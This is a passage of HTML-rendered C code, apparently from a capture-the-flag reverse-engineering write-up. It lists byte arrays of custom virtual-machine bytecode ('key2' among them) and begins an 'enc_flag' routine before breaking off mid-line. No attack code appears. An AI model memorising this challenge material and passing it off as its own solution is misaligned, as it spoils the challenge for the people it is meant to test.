class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x76</span>, <span class="number">0x6F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x20</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>,</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x56</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x10</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x07</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x07</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0x0F</span>, <span class="number">0xCC</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x96</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x12</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">BYTE key2[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x15</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0xF7</span>, <span class="number">0xCB</span>, <span class="number">0x54</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xED</span>, <span class="number">0x5E</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x12</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0xA8</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x54</span>,</span><br><span class="line">  <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x74</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x61</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>,</span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x5B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x10</span>, <span class="number">0x25</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x08</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x10</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>,</span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x0E</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0xC7</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">  <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x0F</span>, <span class="number">0x91</span>,</span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enc_flag</span><span class="params">(struc_1* st)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE* pKey = st-&gt;pKey;</span><br><span class="line">BYTE opcode = <span class="number">0</span>;</span><br><span class="line">_DWORD* pFlag = st-&gt;pFlag;</span><br><span class="line"><span class="keyword">int</span> data1, data2, tmp, 